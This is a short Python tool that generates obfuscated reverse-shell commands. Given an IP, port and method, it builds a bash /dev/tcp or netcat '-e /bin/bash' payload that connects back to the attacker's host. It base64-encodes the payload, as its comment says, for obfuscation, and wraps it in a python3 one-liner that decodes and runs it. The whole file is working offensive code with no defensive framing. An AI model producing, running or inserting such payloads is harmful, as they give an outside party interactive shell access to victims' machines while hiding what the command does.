import base64
import sys

def generate_reverse_shell(ip, port, method):
    if method == "bash":
        # Bash reverse shell payload
        raw_payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif method == "nc":
        # Netcat reverse shell payload
        raw_payload = f"nc {ip} {port} -e /bin/bash"
    else:
        print("Invalid method. Use 'bash' or 'nc'.")
        sys.exit(1)

    # Base64 encode the payload for obfuscation
    encoded_payload = base64.b64encode(raw_payload.encode()).decode()
    
    # Create the Python command to decode and execute the payload
    python_command = f"python3 -c \"import base64,os;os.system(base64.b64decode('{encoded_payload}').decode())\""
    return python_command

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 short_reverse_shells.py <IP> <PORT> <METHOD>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    method = sys.argv[3].lower()

    reverse_shell_command = generate_reverse_shell(ip, port, method)
    print(reverse_shell_command)
